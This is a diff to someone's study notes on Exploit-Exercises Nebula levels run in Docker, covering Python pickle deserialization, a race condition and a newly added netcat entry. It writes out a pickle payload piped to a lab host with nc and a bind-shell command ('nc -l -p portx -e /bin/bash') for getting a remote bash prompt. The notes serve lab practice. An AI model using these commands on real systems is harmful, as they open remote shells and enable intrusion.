@@ -30,7 +30,7 @@
 *finish in 191009*  
 *introduction:*
 * * reference<https://github.com/1u4nx/Exploit-Exercises-Nebula/blob/master/Level17%E2%80%94%E2%80%94Python%E7%9A%84pickle%E6%A0%BC%E5%BC%8F%E5%8F%AF%E6%89%A7%E8%A1%8C%E8%84%9A%E6%9C%AC%E6%BC%8F%E6%B4%9E.org>,This itme contain two knownledge point:command netcat and pickle,the program monitor port 10007,and use pickle.loads deserialization,but you should use "cat ls | nc 172.17.0.2 10007" send this str to serever machine in you client machine,ls:"S'isme'\np0\n.",  
-## Docker9:Assecc to the race condition
+## Docker9:Access to the race condition
 * finish in 191010
 * what question when finish it
 	1. *use nc to establish monitor:nc -l -p 18211,the -l must in the front of -p*
@@ -38,3 +38,8 @@
 	3. *access and open:after access and before open,you can change the file use 2*s
 * introduction:  
 *reference<https://github.com/1u4nx/Exploit-Exercises-Nebula/blob/master/Level10%E2%80%94%E2%80%94%E8%AE%BF%E9%97%AE%E7%AB%9E%E6%80%81%E6%9D%A1%E4%BB%B6%E6%BC%8F%E6%B4%9E.org>,answer this item,you need open three window.*  
+## DOcker10:use ncat -e
+* finish in 191011
+* __introduction:__
+    This item is about nc cracker command,in the container,I run the command "nc -l -p portx -e /bin/bash",and when you get into the envirnoment,the system monitor the port automatically,and you need get the ip of the container,finally,you input "nc ip portxx" in you machine,you can get the "bash"  
+
